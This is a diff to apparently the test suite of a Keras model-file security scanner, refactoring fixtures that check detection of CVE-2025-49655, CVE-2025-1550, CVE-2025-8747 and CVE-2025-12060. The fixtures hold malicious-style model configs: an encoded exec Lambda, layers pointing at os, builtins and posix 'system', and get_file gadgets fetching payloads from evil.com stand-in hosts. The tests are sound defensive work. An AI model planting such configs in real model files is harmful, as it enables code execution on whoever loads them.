         encoded_code = base64.b64encode(b"exec('print(1)')").decode()
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "keras.models.Sequential",
-                            "name": "qualified_nested_model",
-                            "config": {
-                                "layers": [
-                                    {
-                                        "class_name": "Lambda",
-                                        "name": "nested_lambda",
-                                        "config": {"function": [encoded_code, None, None]},
-                                    }
-                                ]
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "keras.models.Sequential",
+                    "name": "qualified_nested_model",
+                    "config": {
+                        "layers": [
+                            {
+                                "class_name": "Lambda",
+                                "name": "nested_lambda",
+                                "config": {"function": [encoded_code, None, None]},
+                            }
+                        ]
+                    },
                 },
-            },
+            ),
             keras_version="2.10.0",
             file_name="qualified_nested_model.keras",
         )
@@ -4486,26 +4297,21 @@ __import__('pickle').loads(data)
         model_class = "keras.src.engine.evil.Sequential"
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": model_class,
-                            "name": "custom_nested_model",
-                            "config": {
-                                "layers": [
-                                    {
-                                        "class_name": "Lambda",
-                                        "name": "nested_lambda",
-                                        "config": {"function": [encoded_code, None, None]},
-                                    }
-                                ]
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": model_class,
+                    "name": "custom_nested_model",
+                    "config": {
+                        "layers": [
+                            {
+                                "class_name": "Lambda",
+                                "name": "nested_lambda",
+                                "config": {"function": [encoded_code, None, None]},
+                            }
+                        ]
+                    },
                 },
-            },
+            ),
             keras_version="2.10.0",
             file_name="untrusted_qualified_nested_model.keras",
         )
@@ -4525,18 +4331,13 @@ __import__('pickle').loads(data)
         """Wrapper-owned layer dictionaries require a class name for complete nested analysis."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "TimeDistributed",
-                            "name": "broken_wrapper",
-                            "config": {"layer": {"config": {"units": 1}}},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "TimeDistributed",
+                    "name": "broken_wrapper",
+                    "config": {"layer": {"config": {"units": 1}}},
                 },
-            },
+            ),
             file_name="broken_wrapped_layer_structure.keras",
         )
 
@@ -4569,18 +4370,13 @@ __import__('pickle').loads(data)
         """Required wrapper-owned nested layer values cannot be silently skipped."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": wrapper_class,
-                            "name": "broken_wrapper",
-                            "config": {config_key: None},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": wrapper_class,
+                    "name": "broken_wrapper",
+                    "config": {config_key: None},
                 },
-            },
+            ),
             file_name=f"null_{wrapper_class}.keras",
         )
 
@@ -4617,18 +4413,13 @@ __import__('pickle').loads(data)
         """Known wrappers missing required nested payloads make coverage incomplete."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": wrapper_class,
-                            "name": "broken_wrapper",
-                            "config": {},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": wrapper_class,
+                    "name": "broken_wrapper",
+                    "config": {},
                 },
-            },
+            ),
             file_name=f"missing_{wrapper_class}.keras",
         )
 
@@ -4649,18 +4440,13 @@ __import__('pickle').loads(data)
         raw_secret = "sk-proj-CAND061ZIPWRAPPERSECRET000000000000"
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "TimeDistributed",
-                            "name": f"wrapper_{raw_secret}",
-                            "config": {},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "TimeDistributed",
+                    "name": f"wrapper_{raw_secret}",
+                    "config": {},
                 },
-            },
+            ),
         )
 
         result = KerasZipScanner().scan(str(keras_path))
@@ -4675,23 +4461,18 @@ __import__('pickle').loads(data)
         """Ordinary layer metadata named `layer`, `cell`, or `cells` must not be treated as nested layers."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": layer_class,
-                            "name": "metadata_layer",
-                            "config": {
-                                "units": 1,
-                                "layer": "encoder",
-                                "cell": "relu",
-                                "cells": ["left", "right"],
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": layer_class,
+                    "name": "metadata_layer",
+                    "config": {
+                        "units": 1,
+                        "layer": "encoder",
+                        "cell": "relu",
+                        "cells": ["left", "right"],
+                    },
                 },
-            },
+            ),
             file_name="nonwrapper_nested_names.keras",
         )
 
@@ -4704,23 +4485,18 @@ __import__('pickle').loads(data)
         """Known-safe non-wrapper layers may use nested-name dictionaries as ordinary metadata."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "Dense",
-                            "name": "metadata_layer",
-                            "config": {
-                                "units": 1,
-                                "layer": {"class_name": "MetadataRecord", "config": {"value": "encoder"}},
-                                "cell": {"class_name": "MetadataCell", "config": {"value": "relu"}},
-                                "cells": [{"class_name": "MetadataCell", "config": {"value": "left"}}],
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "Dense",
+                    "name": "metadata_layer",
+                    "config": {
+                        "units": 1,
+                        "layer": {"class_name": "MetadataRecord", "config": {"value": "encoder"}},
+                        "cell": {"class_name": "MetadataCell", "config": {"value": "relu"}},
+                        "cells": [{"class_name": "MetadataCell", "config": {"value": "left"}}],
+                    },
                 },
-            },
+            ),
             file_name="nonwrapper_nested_dict_names.keras",
         )
 
@@ -4738,25 +4514,20 @@ __import__('pickle').loads(data)
         """A nullable optional Bidirectional backward layer must not make a valid config inconclusive."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "Bidirectional",
-                            "name": "bidirectional_wrapper",
-                            "config": {
-                                "layer": {
-                                    "class_name": "LSTM",
-                                    "name": "forward_lstm",
-                                    "config": {"name": "forward_lstm"},
-                                },
-                                "backward_layer": None,
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "Bidirectional",
+                    "name": "bidirectional_wrapper",
+                    "config": {
+                        "layer": {
+                            "class_name": "LSTM",
+                            "name": "forward_lstm",
+                            "config": {"name": "forward_lstm"},
+                        },
+                        "backward_layer": None,
+                    },
                 },
-            },
+            ),
             file_name="nullable_backward_layer.keras",
         )
 
@@ -4781,10 +4552,9 @@ __import__('pickle').loads(data)
 
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {"layers": [nested_layer]},
-            },
+            _sequential_config(
+                nested_layer,
+            ),
             file_name="deep_wrapped_layer.keras",
         )
 
@@ -4857,24 +4627,19 @@ __import__('pickle').loads(data)
         monkeypatch.setattr(KerasZipScanner, "MAX_NESTED_LAYER_ITEMS", 2)
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "StackedRNNCells",
-                            "name": "oversized_cells",
-                            "config": {
-                                "cells": [
-                                    {"class_name": "LSTMCell", "config": {}},
-                                    {"class_name": "GRUCell", "config": {}},
-                                    {"class_name": "SimpleRNNCell", "config": {}},
-                                ]
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "StackedRNNCells",
+                    "name": "oversized_cells",
+                    "config": {
+                        "cells": [
+                            {"class_name": "LSTMCell", "config": {}},
+                            {"class_name": "GRUCell", "config": {}},
+                            {"class_name": "SimpleRNNCell", "config": {}},
+                        ]
+                    },
                 },
-            },
+            ),
             file_name="oversized_wrapped_cells.keras",
         )
 
@@ -4906,30 +4671,25 @@ __import__('pickle').loads(data)
         monkeypatch.setattr(KerasZipScanner, "MAX_NESTED_LAYER_ITEMS", 3)
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "RNN",
-                            "name": "outer_rnn",
+            _sequential_config(
+                {
+                    "class_name": "RNN",
+                    "name": "outer_rnn",
+                    "config": {
+                        "cell": {
+                            "class_name": "StackedRNNCells",
+                            "name": "nested_cells",
                             "config": {
-                                "cell": {
-                                    "class_name": "StackedRNNCells",
-                                    "name": "nested_cells",
-                                    "config": {
-                                        "cells": [
-                                            {"class_name": "LSTMCell", "config": {}},
-                                            {"class_name": "GRUCell", "config": {}},
-                                            {"class_name": "SimpleRNNCell", "config": {}},
-                                        ]
-                                    },
-                                }
+                                "cells": [
+                                    {"class_name": "LSTMCell", "config": {}},
+                                    {"class_name": "GRUCell", "config": {}},
+                                    {"class_name": "SimpleRNNCell", "config": {}},
+                                ]
                             },
                         }
-                    ]
+                    },
                 },
-            },
+            ),
             file_name="global_nested_layer_budget.keras",
         )
 
@@ -5234,18 +4994,13 @@ __import__('pickle').loads(data)
     def test_non_string_layer_class_reports_invalid_type_without_abort(self, tmp_path: Path) -> None:
         """Malformed non-string class names should fail closed without crashing redaction."""
         class_secret = "ZIP_LAYER_CLASS_REPR_SECRET"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": {"api_key": [class_secret]},
-                        "name": "structured_class",
-                        "config": {},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": {"api_key": [class_secret]},
+                "name": "structured_class",
+                "config": {},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, file_name="structured_class.keras")
         result = KerasZipScanner().scan(str(model_path))
@@ -5617,18 +5372,13 @@ class TestCVE202549655TorchModuleWrapper:
     def test_torch_module_wrapper_detected_critical(self, tmp_path: Path) -> None:
         """TorchModuleWrapper layer should be flagged as CRITICAL."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "TorchModuleWrapper",
-                        "name": "torch_wrapper_1",
-                        "config": {"module": "my_torch_module"},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "TorchModuleWrapper",
+                "name": "torch_wrapper_1",
+                "config": {"module": "my_torch_module"},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
@@ -5664,18 +5414,13 @@ class TestCVE202549655TorchModuleWrapper:
     def test_no_false_positive_dense_layer(self, tmp_path: Path) -> None:
         """Dense layers should NOT trigger CVE-2025-49655."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {"units": 10},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {"units": 10},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
@@ -5734,18 +5479,13 @@ class TestCVE202549655TorchModuleWrapper:
     def test_no_cve_outside_affected_keras_range(self, tmp_path: Path, keras_version: str) -> None:
         """Keras builds outside >= 3.11.0 and < 3.11.3 should not be CVE-attributed."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "TorchModuleWrapper",
-                        "name": "torch_wrapper_1",
-                        "config": {"module": "my_torch_module"},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "TorchModuleWrapper",
+                "name": "torch_wrapper_1",
+                "config": {"module": "my_torch_module"},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
         assert len(cve_issues) == 0, "Versions outside the affected range should not get CVE attribution"
@@ -5756,10 +5496,9 @@ class TestCVE202549655TorchModuleWrapper:
     def test_two_part_version_is_treated_as_vulnerable(self, tmp_path: Path) -> None:
         """Keras 3.11 should be interpreted as vulnerable (patch=0)."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}},
+        )
         result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, "3.11"))
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
         assert len(cve_issues) >= 1
@@ -5768,10 +5507,9 @@ class TestCVE202549655TorchModuleWrapper:
     def test_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
         """PEP 440 prerelease/dev versions in vulnerable 3.11.x range should be flagged."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}},
+        )
 
         for prerelease_version in ["3.11.1rc1", "3.11.2.dev0"]:
             result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, prerelease_version))
@@ -5799,10 +5537,9 @@ class TestCVE202549655TorchModuleWrapper:
     ) -> None:
         """Prereleases of the fixed boundary sort before final 3.11.3 and remain vulnerable."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}},
+        )
 
         result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))
 
@@ -5829,10 +5566,9 @@ class TestCVE202549655TorchModuleWrapper:
     ) -> None:
         """Long valid local labels must not change public-version CVE attribution."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}},
+        )
 
         result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))
 
@@ -5908,10 +5644,9 @@ class TestCVE202549655TorchModuleWrapper:
     def test_malformed_boundary_qualifier_is_warning_only(self, tmp_path: Path, keras_version: str) -> None:
         """Malformed prerelease lookalikes must not receive critical CVE attribution."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}},
+        )
 
         result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))
 
@@ -5926,10 +5661,9 @@ class TestCVE202549655TorchModuleWrapper:
     def test_torch_module_wrapper_version_unknown(self, tmp_path: Path) -> None:
         """Missing or non-canonical version should emit warning, not pass."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}},
+        )
         keras_path = tmp_path / "unknown_version.keras"
         with zipfile.ZipFile(keras_path, "w") as zf:
             zf.writestr("config.json", json.dumps(config))
@@ -5951,19 +5685,14 @@ class TestCVE20251550ModuleReferences:
     def test_dangerous_module_os_in_layer(self, tmp_path: Path) -> None:
         """A layer referencing 'os' module should be flagged as CRITICAL."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "os",
-                        "config": {"units": 10},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "module": "os",
+                "config": {"units": 10},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
@@ -5994,19 +5723,14 @@ class TestCVE20251550ModuleReferences:
     def test_dangerous_module_builtins_dotpath(self, tmp_path: Path) -> None:
         """A layer referencing 'builtins.eval' should be flagged as CRITICAL."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "evil_dense",
-                        "module": "builtins",
-                        "config": {"units": 1},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "evil_dense",
+                "module": "builtins",
+                "config": {"units": 1},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
@@ -6044,20 +5768,15 @@ class TestCVE20251550ModuleReferences:
     ) -> None:
         """Known executable native symbols should be treated like their public aliases."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "function",
-                        "name": "native_evil",
-                        "module": module_value,
-                        "config": symbol,
-                        "registered_name": symbol,
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "function",
+                "name": "native_evil",
+                "module": module_value,
+                "config": symbol,
+                "registered_name": symbol,
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6097,19 +5816,14 @@ class TestCVE20251550ModuleReferences:
     ) -> None:
         """Importable modules do not execute when the requested layer symbol does not exist."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "unresolved_native_layer",
-                        "module": module_value,
-                        "config": {"units": 1},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "unresolved_native_layer",
+                "module": module_value,
+                "config": {"units": 1},
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6118,18 +5832,13 @@ class TestCVE20251550ModuleReferences:
 
     def _assert_safe_native_child(self, tmp_path: Path, module_value: str, layer_name: str) -> None:
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": layer_name,
-                        "config": {"fn_module": module_value},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": layer_name,
+                "config": {"fn_module": module_value},
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6227,27 +5936,22 @@ class TestCVE20251550ModuleReferences:
     def test_nested_serialized_native_function_is_critical(self, tmp_path: Path) -> None:
         """Nested activations use serialized function dicts that must not bypass module checks."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_with_native_activation",
-                        "module": "keras.layers",
-                        "config": {
-                            "units": 1,
-                            "activation": {
-                                "module": "posix",
-                                "class_name": "function",
-                                "config": "system",
-                                "registered_name": "system",
-                            },
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_with_native_activation",
+                "module": "keras.layers",
+                "config": {
+                    "units": 1,
+                    "activation": {
+                        "module": "posix",
+                        "class_name": "function",
+                        "config": "system",
+                        "registered_name": "system",
+                    },
+                },
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6319,26 +6023,21 @@ class TestCVE20251550ModuleReferences:
     def test_flax_layer_serialized_module_function_is_critical(self, tmp_path: Path) -> None:
         """FlaxLayer deserializes its dict-valued module config before model use."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "FlaxLayer",
-                        "name": "flax_native_module",
-                        "module": "keras.layers",
-                        "config": {
-                            "module": {
-                                "module": "posix",
-                                "class_name": "function",
-                                "config": "system",
-                                "registered_name": "system",
-                            }
-                        },
+        config = _sequential_config(
+            {
+                "class_name": "FlaxLayer",
+                "name": "flax_native_module",
+                "module": "keras.layers",
+                "config": {
+                    "module": {
+                        "module": "posix",
+                        "class_name": "function",
+                        "config": "system",
+                        "registered_name": "system",
                     }
-                ]
+                },
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6350,35 +6049,30 @@ class TestCVE20251550ModuleReferences:
     def test_feature_space_nested_preprocessor_function_is_critical(self, tmp_path: Path) -> None:
         """Unregistered Feature wrappers must not hide their deserialized preprocessors."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "FeatureSpace",
-                        "name": "features",
-                        "module": "keras.utils",
-                        "config": {
-                            "features": {
-                                "x": {
-                                    "module": "keras.src.layers.preprocessing.feature_space",
-                                    "class_name": "Feature",
-                                    "config": {
-                                        "dtype": "float32",
-                                        "output_mode": "float",
-                                        "preprocessor": {
-                                            "module": "posix",
-                                            "class_name": "function",
-                                            "config": "system",
-                                        },
-                                    },
-                                }
-                            }
-                        },
+        config = _sequential_config(
+            {
+                "class_name": "FeatureSpace",
+                "name": "features",
+                "module": "keras.utils",
+                "config": {
+                    "features": {
+                        "x": {
+                            "module": "keras.src.layers.preprocessing.feature_space",
+                            "class_name": "Feature",
+                            "config": {
+                                "dtype": "float32",
+                                "output_mode": "float",
+                                "preprocessor": {
+                                    "module": "posix",
+                                    "class_name": "function",
+                                    "config": "system",
+                                },
+                            },
+                        }
                     }
-                ]
+                },
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6463,26 +6157,21 @@ class TestCVE20251550ModuleReferences:
     def test_nested_non_object_module_metadata_is_not_flagged(self, tmp_path: Path) -> None:
         """Arbitrary metadata dictionaries should not be treated as serialized Keras objects."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "metadata_only",
-                        "module": "keras.layers",
-                        "config": {
-                            "units": 1,
-                            "metadata": {
-                                "class_name": "Report",
-                                "module": "posix",
-                                "config": {"summary": "Runtime compatibility report"},
-                            },
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "metadata_only",
+                "module": "keras.layers",
+                "config": {
+                    "units": 1,
+                    "metadata": {
+                        "class_name": "Report",
+                        "module": "posix",
+                        "config": {"summary": "Runtime compatibility report"},
+                    },
+                },
             },
-        }
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6504,10 +6193,9 @@ class TestCVE20251550ModuleReferences:
     ) -> None:
         """Malformed layer metadata that Keras does not deserialize must not be promoted to critical."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [layer]},
-        }
+        config = _sequential_config(
+            layer,
+        )
 
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
@@ -6544,20 +6232,15 @@ class TestCVE20251550ModuleReferences:
 
     def _assert_untrusted_keras_module(self, tmp_path: Path, module_name: str, failure_message: str) -> None:
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "lambda_1",
-                        "config": {
-                            "fn_module": module_name,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "lambda_1",
+                "config": {
+                    "fn_module": module_name,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
@@ -6572,19 +6255,14 @@ class TestCVE20251550ModuleReferences:
 
     def _assert_safe_keras_module(self, tmp_path: Path, module_name: str, failure_message: str) -> None:
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": module_name,
-                        "config": {"units": 10},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "module": module_name,
+                "config": {"units": 10},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
@@ -6633,19 +6311,14 @@ class TestCVE20251550ModuleReferences:
     def test_cve_attribution_details(self, tmp_path: Path) -> None:
         """CVE-2025-1550 details should be present in issue details."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "os",
-                        "config": {"units": 10},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "module": "os",
+                "config": {"units": 10},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
@@ -6659,19 +6332,14 @@ class TestCVE20251550ModuleReferences:
     def test_none_module_value_not_flagged(self, tmp_path: Path) -> None:
         """Layer with module=None should not trigger CVE-2025-1550."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": None,
-                        "config": {"units": 10},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "module": None,
+                "config": {"units": 10},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
@@ -6718,22 +6386,17 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
         """Config referencing get_file with URL should be CRITICAL."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "keras.utils",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.com/payload.bin",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "module": "keras.utils",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.com/payload.bin",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
@@ -6795,21 +6458,16 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
         """Config with URL inside args list should also be detected."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "args": ["https://evil.com/payload.bin"],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "args": ["https://evil.com/payload.bin"],
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
@@ -6819,21 +6477,16 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_with_url_in_nested_kwargs_detected(self, tmp_path: Path) -> None:
         """Nested kwargs URL should still be attributed to the get_file invocation."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "kwargs": {"url": "https://evil.com/payload.bin"},
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "kwargs": {"url": "https://evil.com/payload.bin"},
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
@@ -6843,22 +6496,17 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_tar_url_detects_cve_2025_12060(self, tmp_path: Path) -> None:
         """get_file(extract=True) with a remote tar URL should be attributed to CVE-2025-12060."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/payload.tar.gz",
-                            "extract": True,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.example/payload.tar.gz",
+                    "extract": True,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
